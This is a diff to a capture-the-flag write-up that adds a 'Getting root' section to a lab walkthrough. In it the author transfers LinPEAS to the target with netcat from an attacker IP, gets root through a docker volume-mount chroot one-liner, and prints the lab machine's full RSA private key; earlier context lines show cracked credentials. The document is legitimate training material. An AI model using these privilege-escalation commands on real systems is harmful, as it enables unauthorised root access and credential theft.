@@ -197,14 +197,60 @@ r00t	: n100906
 admin	: mrsheafy
 </em></span></p>
 
-## Part 3 - Gathering Intel 
+## Part 3 - Getting root 
 
 ### what are the first 9 characters of the root user's private SSH key?
 
 - The first thing im going to do is log into the ssh server using the user:pass we found in the last section.
 - The admin account doesnt work for the ssh server but it might for the :31331/partners.html login page. It brings us to message from lp1 to please look at the servers configuration files.
 - r00t is able to log into the ssh server.
--   
+- From here I check sudo -l, any files avaiable on the server to use, as far as I could tell there wasnt anything obvious to use. From here I imported linpeas onto the ssh server and ran it. I transfered it using these commands.
+
+<p><span style="color:green"><em>
+Host side
+nc -l 8001 < linpeas.sh
+
+Client side
+nc -nv 10.10.145.62 8001 > linpeas.sh
+</em></span></p>
+
+LinPEAS gives us a 99% PE vector on docker for this box. By going to the [gtfo bins](https://gtfobins.github.io/gtfobins/docker/), we can see if a root shell is possible. 
+
+I ran this command
+- docker run -v /:/mnt --rm -it bash chroot /mnt sh
+
+And like that I have root! In order to find the first 9 characters of the root users ssh key, we need to go to /etc/ssh, then cat the ssh_host_rsa_key. And like that we have the private key! It is posted below:
+
+<p><span style="color:green"><em>
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEA4hZe4rMGbDJ5yNkbl9HszDFY1FxWNZSZma9/h+9NWQOpyVG9
+spmcl7rBP8Lqi+AWfseYBdgyy0R+33SZHXm7rmjKULUHxHbDjE/iWpEIAg5bN/BR
+9Y3K6RiNzGOeXh3EopU/xLBK5rr2L9bN2L6nbOsaMcrxoHabXaomo+ChQTUg1Z3g
+khfyuyEHW2rzN0O0oCnIRyVB7elzt4CApmZqvLUgHXdm9iJP62M6SIsjLXz94lrM
+lYI0f6vKEdPAtpRaTzfLksiB5Hh9actGhpfldRO49sr1TCG+Jt4xrS1h/PYnj015
+ny5Ip9n3k+qgJu2nHZLWUSU42ifJRDBUxxIoyQIDAQABAoIBAG1f9y1jAHNtg983
+sRKkexNZuCicNxSavChOb7r6eQfcLtJ3GfeCOvBoZ78J8+ARW7CfrJr/Oat+ioZd
+6QkKcFJy3ZVnzscr0XRa3R2FVkNwYI7SU0QhAY380/SSKPZNHmitHXlw8/tlbV49
+Y748ldCqeDSognZnisgoXaMgM8LQITj2mnA8j/Lg88HcELF+gW56QuoQHVPJGzJA
++ZW0Zx+duLd4vxgQET2iGGTtClfopv6xmRkjrLOev5DpioM/1eMw75MFVtEGqYtH
+CAAxT/T0feE0f9hbxJz/52rM1sV0YgkcvDjZeJqMdVq6xULuLmScahUlRZcoMsJv
+Q+lQPOUCgYEA8M0u3YwP/PoeywDAOlIcesgJbOQ+/lXw7FzXDsq4die0aJLz+U6P
+e214mQe6QdZ2uCnrnqeU40aBR3bB6CHl4mvrbQqjqAwJ/bDjnO2dXqdPNBdNnzpq
+D9k9cl1UbJo1MrbMZnClNpGgq6LHbpUne24GTVNOHNDdi/KBPjECv1MCgYEA8Ftw
+tEZeQg/XGuUtXLZ9TM+syM73rW0TbtIz2ZfOT6EVWj9aURrb6to2ctlnMyiaxzUX
+OewMKbRi6qv8GzBBxvf8h/hc+DfwtfNgFyhk7BZcfUTzLJNph1RuNL+3fEI+q+Oh
+84qaRguvqRyBF2DdGXSRF3G+9gS0lq6MPoaWn/MCgYAp97i5SBXpQzZmrwTRpUnt
+ZDuwTL9l2Fia+TtKCq7HePgKWcJHqxd6rYOdOCmQG+6o/jVge1iJm9ogOGRnLrFA
+Gwr3ACmxuhdrrY6d5RPOUV6Od5lBrQ6bIIODER0LqHypEA7js7I3pn3YLBCSB1DQ
+REa451Hv178lCujXi/csnQKBgBqm2Ql0YBFNNlnqHayRI7W3tX4SzQ3y8VuxfURc
+e+kCgJ6gNcCWjNou1ijICJR4pSj/rxKiJPse4HULGwpcwH5ykxL0rEJt2Ygjc309
+4mr3U8wkMB66PdJev1WkCJGDuvVOaW/a555qv1CuM3ZHLF0dOtVxrG4VOX0X378z
+J1KXAoGAD3Fgekr1R6p795GQXBCfamrmhQUyap3IcbP/tA6P+QtDgfk0SpGM9GRm
+dfXTWZrbCfNmyIP0utA8pjQd1j286r/j3prnMGdmtZbzzSSm3OefbJwja77Iym+K
+RFoEX9C9QcxExgPpGf+BQWz5SI1NvyesI9DOCdZufDhfpgQINgU=
+-----END RSA PRIVATE KEY-----
+</em></span></p>
+
 
   
 
